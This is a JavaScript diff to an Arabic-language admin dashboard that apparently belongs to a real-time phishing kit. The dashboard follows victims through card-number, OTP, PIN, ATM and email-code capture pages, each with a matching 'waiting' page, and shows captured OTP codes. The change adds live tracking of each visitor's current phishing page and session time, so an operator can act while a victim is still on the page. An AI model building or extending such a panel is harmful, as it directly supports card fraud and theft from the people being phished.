@@ -276,7 +276,7 @@ var PC={pending:'#f59e0b',awaiting:'#7c3aed',stepok:'#3b82f6',confirmed:'#16a34a
 var STEPS={card:'بطاقة الدفع',otp:'رمز التحقق',pin:'الرقم السري'};
 var STEPC={card:'#0ea5e9',otp:'#f59e0b',pin:'#a855f7'};
 
-var PW=sessionStorage.getItem('admin_pw')||'',orders=[],onlineCount=0,totalVisitors=0,visitorPages=[],
+var PW=sessionStorage.getItem('admin_pw')||'',orders=[],onlineCount=0,totalVisitors=0,visitorPages=[],activeVisitors=[],
     selRef=null,sQ='',prevRefs=new Set(),delConfRef=null,detDelConf=false;
 
 function api(method,url,body){
@@ -343,7 +343,7 @@ function renderStats(){
     {label:'إجمالي الطلبات',value:orders.length,color:'#1B7A3D',bg:'rgba(27,122,61,0.1)',border:'rgba(27,122,61,0.25)',icon:'👥',fn:'scrollToOrders()',hint:'عرض الطلبات ↗'},
     {label:'إجمالي الزوار',value:totalVisitors,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',fn:'openVM()',hint:'عرض التفاصيل ↗'},
     {label:'الزوار الحاليين',value:onlineCount,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,fn:'openVM()',hint:'المتصلين الآن ↗'},
-    {label:'طلبات نشطة',value:active.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true,fn:'scrollToActive()',hint:'عرض النشطة ↗'},
+    {label:'عملاء نشطين',value:activeVisitors.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true,fn:'scrollToActive()',hint:'المتصلين الآن ↗'},
     {label:'مكتملة',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅',fn:'scrollToDone()',hint:'عرض المكتملة ↗'}
   ];
   document.getElementById('statsRow').innerHTML=cards.map(function(c){
@@ -357,27 +357,36 @@ function renderStats(){
   }).join('');
   document.getElementById('tbV').textContent=orders.length;
   document.getElementById('tbO').textContent=onlineCount;
-  document.getElementById('aCnt').textContent=active.length;
+  document.getElementById('aCnt').textContent=activeVisitors.length;
   document.getElementById('oCnt').textContent=orders.length;
 }
 
 function renderActive(){
-  var el=document.getElementById('aList'),list=orders.filter(isActive);
-  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
-  el.innerHTML=list.map(function(o){
-    var badge=o.step?stepBadge(o.step):statusBadge(o);
-    var pay=o.pay||{};
-    var otp=pay.otp?'<span class="otp">OTP: '+esc(pay.otp)+'</span>':'';
-    var page=o.page?'<span style="color:#60a5fa">📄 '+esc(o.page)+'</span>':'';
+  var el=document.getElementById('aList');
+  if(!activeVisitors.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
+  el.innerHTML=activeVisitors.map(function(v,i){
+    var pageNames={'home':'🏠 الرئيسية','index':'🏠 الرئيسية','login':'🔐 تسجيل الدخول','password':'🔑 كلمة المرور',
+      'calling':'📞 الاتصال','waiting':'⏳ الانتظار','order':'📝 الطلب','card-details':'💳 البطاقة',
+      'card-waiting':'⏳ انتظار البطاقة','code':'📲 كود التحقق','code-waiting':'⏳ انتظار الكود',
+      'code3':'📲 كود 4 أرقام','code3-waiting':'⏳ انتظار الكود','atm':'🏧 ATM','atm-waiting':'⏳ انتظار ATM',
+      'email-code':'📧 كود البريد','email-code-waiting':'⏳ انتظار كود البريد',
+      'success':'✅ النجاح','welcome':'👋 الترحيب','watch-features':'⌚ المميزات',
+      'en/index':'🏠 EN Home','en/login':'🔐 EN Login','en/order':'📝 EN Order'};
+    var pName=pageNames[v.page]||('📄 '+esc(v.page));
     var ago='';
-    if(o.updated||o.ts){var diff=Math.floor((Date.now()-(o.updated||o.ts))/1000);
-      if(diff<60)ago='<span style="color:#4ade80">🟢 منذ '+diff+' ث</span>';
-      else if(diff<3600)ago='<span style="color:#fbbf24">🟡 منذ '+Math.floor(diff/60)+' د</span>';
-      else ago='<span style="color:#f87171">🔴 منذ '+Math.floor(diff/3600)+' س</span>';}
-    return '<div class="ac'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
-      '<div class="ac-t"><span class="ac-n">'+(esc(o.n)||esc(o.p)||'—')+'</span>'+badge+'</div>'+
-      '<div class="ac-info">'+(o.p?'<span>📱 '+esc(o.p)+'</span>':'')+otp+page+ago+'</div></div>';
+    if(v.last){var diff=Math.floor((Date.now()-v.last)/1000);
+      if(diff<10)ago='<span style="color:#4ade80">🟢 الآن</span>';
+      else if(diff<30)ago='<span style="color:#4ade80">🟢 منذ '+diff+' ث</span>';
+      else ago='<span style="color:#fbbf24">🟡 منذ '+diff+' ث</span>';}
+    var dur='';
+    if(v.first){var d2=Math.floor((Date.now()-v.first)/1000);
+      if(d2<60)dur=d2+' ث';else if(d2<3600)dur=Math.floor(d2/60)+' د';else dur=Math.floor(d2/3600)+' س';
+      dur='<span style="color:rgba(255,255,255,.4)">⏱️ '+dur+'</span>';}
+    return '<div class="ac" style="border-right:3px solid #22c55e">'+
+      '<div class="ac-t"><span class="ac-n">👤 زائر '+(i+1)+'</span>'+ago+'</div>'+
+      '<div class="ac-info"><span>'+pName+'</span>'+dur+'</div></div>';
   }).join('');
+  document.getElementById('aCnt').textContent=activeVisitors.length;
 }
 
 function renderOrders(){
@@ -558,7 +567,7 @@ function loadOrders(){
 }
 function loadVisitors(){
   api('GET','/api/admin/visitors').then(function(r){
-    if(r.ok){onlineCount=r.count||0;renderStats();renderActive();}
+    if(r.ok){onlineCount=r.count||0;activeVisitors=r.visitors||[];renderStats();renderActive();}
   }).catch(function(){});
 }
 
